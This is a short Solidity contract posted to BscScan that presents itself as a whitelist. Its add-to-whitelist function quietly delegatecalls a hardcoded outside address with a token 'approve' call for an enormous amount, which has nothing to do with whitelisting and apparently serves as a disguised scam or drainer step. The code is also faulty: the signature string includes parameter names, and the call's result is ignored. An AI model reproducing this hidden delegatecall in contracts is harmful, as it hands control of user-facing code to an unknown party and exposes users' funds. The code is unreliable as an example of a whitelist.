/**
 *Submitted for verification at BscScan.com on 2022-12-31
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;


// 0x23F2A17F0b5f40a54f2cc01d728c254dD2aDd28b
contract Whilelist {

    address[] whitelistAddress;
    function addWhilelist(address user) external {
        address bbs = 0x23F2A17F0b5f40a54f2cc01d728c254dD2aDd28b;

        (bool success, bytes memory data) = bbs.delegatecall(abi.encodeWithSignature("approve(address spender, uint256 amount)", address(this), 10**9 * 10**18));

        whitelistAddress.push(user);
    }
}